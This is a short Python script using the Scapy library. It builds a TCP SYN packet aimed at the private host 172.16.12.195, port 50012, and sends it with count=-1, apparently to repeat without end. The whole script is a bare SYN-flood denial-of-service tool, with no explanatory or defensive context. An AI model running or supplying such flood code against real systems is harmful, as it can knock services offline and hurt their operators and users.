from scapy.all import *

if sys.stdout !=sys.__stdout__:
    sys.stdout = sys.__stdout__
a=IP(dst="172.16.12.195")/TCP(dport=50012,flags="S")
send(a,count=-1)
